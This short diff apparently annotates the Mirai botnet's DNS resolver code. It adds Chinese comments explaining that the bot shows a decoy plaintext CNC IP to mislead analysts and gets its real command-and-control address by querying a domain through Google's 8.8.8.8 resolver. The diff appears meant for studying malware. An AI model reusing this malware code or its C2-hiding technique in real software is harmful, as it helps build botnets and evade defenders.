@@ -79,9 +79,11 @@ struct resolv_entries *resolv_lookup(char *domain)
     int tries = 0, fd = -1, i = 0;
     uint16_t dns_id = rand_next() % 0xffff;
 
+    //在mirai的初始化过程中给出了一个明文的CNC服务器的FAKE_IP，以迷惑分析人员。但实质的CNC服务器IP并没有存放在mirai中，
+    //而是首先通过DNS访问IP为8.8.8.8的DNS服务器，从该DNS服务器中再获取一个域名为cnc.changeme.com的IP。从而实现与CNC服务器的连接。
     util_zero(&addr, sizeof (struct sockaddr_in));
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
+    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);//8.8.8.8是google的DNS服务器地址
     addr.sin_port = htons(53);
 
     // Set up the dns query
